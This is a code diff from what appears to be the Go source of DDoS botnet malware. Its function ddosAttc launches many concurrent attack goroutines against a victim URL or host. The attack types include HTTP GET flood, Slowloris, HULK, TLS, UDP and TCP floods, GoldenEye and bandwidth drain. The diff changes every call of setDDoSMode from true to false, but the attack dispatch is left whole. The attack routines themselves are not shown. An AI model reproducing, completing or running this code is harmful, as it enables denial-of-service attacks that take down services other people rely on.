@@ -20,21 +20,21 @@ import (
 func ddosAttc(attc string, vic string, threads int, interval int) { //HTTPGetAttack; DDoSAttc("0","http://example.com",100)
 	if attc == "0" { //HTTPGet
 		if strings.Contains(vic, "http://") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			for i := 0; i < threads; i++ {
 				go httpGetAttack(vic, interval)
 			}
 		}
 	} else if attc == "1" { //Slowloris
 		if strings.Contains(vic, "http://") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			for i := 0; i < threads; i++ {
 				go slowlorisAttack(vic, interval)
 			}
 		}
 	} else if attc == "2" { //HULK
 		if strings.Contains(vic, "http://") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			u, _ := url.Parse(vic)
 			for i := 0; i < threads; i++ {
 				go hulkAttack(vic, u.Host, interval)
@@ -42,21 +42,21 @@ func ddosAttc(attc string, vic string, threads int, interval int) { //HTTPGetAtt
 		}
 	} else if attc == "3" { //TLS Flood
 		if strings.Contains(vic, ":") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			for i := 0; i < threads; i++ {
 				go tlsAttack(vic, interval)
 			}
 		}
 	} else if attc == "4" { //UDP Flood
 		if strings.Contains(vic, ":") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			for i := 0; i < threads; i++ {
 				go udpAttack(vic, interval)
 			}
 		}
 	} else if attc == "5" { //TCP Flood
 		if strings.Contains(vic, ":") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			for i := 0; i < threads; i++ {
 				go tcpAttack(vic, interval)
 			}
@@ -64,21 +64,21 @@ func ddosAttc(attc string, vic string, threads int, interval int) { //HTTPGetAtt
 
 	} else if attc == "6" { //GoldenEye
 		if strings.Contains(vic, "http://") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			for i := 0; i < threads; i++ {
 				go goldenEyeAttack(vic, interval)
 			}
 		}
 	} else if attc == "7" { //Bandwidth Drain
 		if strings.Contains(vic, "http://") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			for i := 0; i < threads; i++ {
 				go bandwidthDrainAttack(vic, interval)
 			}
 		}
 	} else if attc == "8" { //Ace
 		if strings.Contains(vic, ".") {
-			setDDoSMode(true)
+			setDDoSMode(false)
 			for i := 0; i < threads; i++ {
 				go aceAttack(vic, interval)
 			}
